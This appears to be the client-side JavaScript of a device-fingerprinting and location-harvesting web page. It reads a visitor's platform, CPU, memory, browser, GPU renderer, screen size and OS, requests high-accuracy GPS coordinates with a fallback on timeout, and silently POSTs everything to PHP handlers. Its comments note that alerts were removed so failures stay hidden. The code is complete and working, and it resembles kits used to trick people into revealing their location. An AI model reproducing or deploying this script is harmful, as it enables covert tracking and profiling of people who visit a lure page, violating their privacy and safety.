function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //ram
  if (ram == undefined) {
    ram = 'Not Available';
  }

  //browser
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Not Available';
  }
  if (ren == undefined) {
    ren = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: 'text'
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    // Detect if device is mobile for optimal settings
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // Mobile-optimized options for better accuracy
    var optn = { 
      enableHighAccuracy: isMobile, // Enable high accuracy on mobile for better GPS
      timeout: isMobile ? 20000 : 10000, // Longer timeout for mobile GPS lock
      maximumAge: isMobile ? 60000 : 300000 // Shorter cache age on mobile for fresher location
    };
    
    // Try high accuracy first, fallback to low accuracy if it fails
    navigator.geolocation.getCurrentPosition(showPosition, function(error) {
      if (error.code === error.TIMEOUT && isMobile) {
        console.log('High accuracy timeout, trying with lower accuracy...');
        var fallbackOptn = {
          enableHighAccuracy: false,
          timeout: 10000,
          maximumAge: 300000
        };
        navigator.geolocation.getCurrentPosition(showPosition, showError, fallbackOptn);
      } else {
        showError(error);
      }
    }, optn);
  } else {
    // Handle case where geolocation is not supported
    showError({ code: 0, message: 'Geolocation not supported' });
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = 'The request to get user location timed out';
        // Removed alert to improve user experience
        console.log('Location request timed out. You may want to enable location services or try again.');
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred';
        break;
      default:
        err_text = 'Geolocation not supported';
        break;
    }

    // Send error data without showing intrusive alerts
    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: function() {
        if (errCallback && typeof errCallback === 'function') {
          errCallback(error, err_text);
        }
      },
      error: function() {
        // Silently handle AJAX errors
        if (errCallback && typeof errCallback === 'function') {
          errCallback(error, err_text);
        }
      },
      mimeType: 'text'
    });
  }
  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
      success: callback,
      mimeType: 'text'
    });
  };
}

